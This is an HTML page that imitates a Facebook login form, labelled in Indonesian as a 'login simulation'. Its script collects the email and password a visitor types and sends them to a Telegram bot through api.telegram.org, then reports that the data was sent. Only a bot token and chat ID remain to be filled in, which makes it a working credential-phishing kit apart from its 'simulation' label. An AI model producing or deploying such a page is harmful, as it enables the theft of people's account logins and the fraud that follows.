<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Simulasi</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
  <div class="w-full max-w-md bg-white p-8 rounded-xl shadow-md">
    <h1 class="text-blue-600 text-3xl font-bold mb-6 text-center">facebook</h1>
    <form id="loginForm">
      <input id="email"
        type="text"
        placeholder="Email atau Nomor Telepon"
        class="w-full px-4 py-3 mb-3 border border-gray-300 rounded-md"
        required
      />
      <input id="password"
        type="password"
        placeholder="Kata Sandi"
        class="w-full px-4 py-3 mb-4 border border-gray-300 rounded-md"
        required
      />
      <button
        type="submit"
        class="w-full bg-blue-600 text-white py-3 rounded-md font-semibold hover:bg-blue-700 transition"
      >
        Masuk
      </button>
    </form>
    <p class="text-center text-sm text-green-600 mt-4" id="statusMsg"></p>
  </div>

  <script>
    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
    const CHAT_ID = 'YOUR_CHAT_ID';

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const message = `🛡️ Login Simulasi:\n📧 Email: ${email}\n🔑 Password: ${password}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      })
      .then(res => res.json())
      .then(data => {
        document.getElementById('statusMsg').textContent = 'Data berhasil dikirim ke Telegram.';
        document.getElementById('loginForm').reset();
      })
      .catch(err => {
        document.getElementById('statusMsg').textContent = 'Gagal mengirim data.';
      });
    });
  </script>
</body>
</html>
